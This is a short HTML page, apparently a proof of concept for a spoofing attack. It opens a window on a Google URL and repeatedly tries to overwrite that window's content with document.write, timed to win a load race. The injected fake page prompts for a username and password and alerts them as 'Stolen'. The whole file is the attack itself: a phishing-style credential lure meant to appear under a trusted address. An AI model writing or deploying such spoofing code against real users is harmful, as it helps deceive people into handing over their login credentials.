<!DOCTYPE html>
<html>
<body>
  <button onclick="spoof()">Click to spoof</button>

  <script>
    function spoof() {
      let win = window.open("https://www.google.com/gen_204", "_blank");
      let payload = `
        <h1>This is NOT Google!</h1>
        <button onclick="
          let u=prompt('Username?'); 
          let p=prompt('Password?'); 
          alert('Stolen: '+u+' / '+p);
        ">Click Me</button>
      `;

      let inject = () => {
        try {
          win.document.open();
          win.document.write(payload);
          win.document.close();
        } catch (e) {
          console.log('Blocked:', e);
        }
      };

      // Multiple attempts to beat load race condition
      setTimeout(inject, 10);
      setTimeout(inject, 50);
      setTimeout(inject, 100);
    }
  </script>
</body>
</html>
